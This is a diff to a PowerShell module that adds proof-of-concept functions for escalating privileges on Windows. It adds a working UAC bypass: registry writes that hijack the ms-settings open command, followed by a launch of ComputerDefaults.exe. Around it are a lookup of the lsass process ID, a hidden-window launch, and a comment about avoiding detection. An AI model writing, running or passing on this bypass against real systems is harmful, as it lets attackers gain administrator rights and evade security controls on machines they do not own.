@@ -233,19 +233,21 @@ clear
 Export-ModuleMember -Function xtmpclean
 Set-Alias -Name xtmpclean -Value xtmpclean
 
-#POC for Windows
+#POC for Windows (over exe file)
 function process-elevate {
     param(
 		[string]$processName
     )
     $Request =  $processName
-$IDPORT = (get-process lsass).Id
-ComputerDefaults -PID '$IDPORT' -File '$Request'
+cmd /c reg add "HKCU\software\classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "$Request" /f
+sleep(10.0)
+cmd /c powershell -Command "New-ItemProperty -Path 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force";clear
+$IDPORT = (get-process lsass).Id;ComputerDefaults -PID '$IDPORT' -File '$Request'
 }
 Export-ModuleMember -Function process-elevate
 Set-Alias -Name process-elevate -Value process-elevate
 
-#warning posible detected
+#POC 2 warning posible detected
 function process-elevate2 {
     param(
 		[string]$processName
@@ -261,7 +263,7 @@ Start-Process -WindowStyle hidden "C:\Windows\System32\ComputerDefaults.exe"
 Export-ModuleMember -Function process-elevate2
 Set-Alias -Name process-elevate2 -Value process-elevate2
 
-#POC for Windows (you must be admin!!)
+#POC 3 for Windows (you must be admin!!)
 function process-elevate2system {
     param(
 		[string]$processName
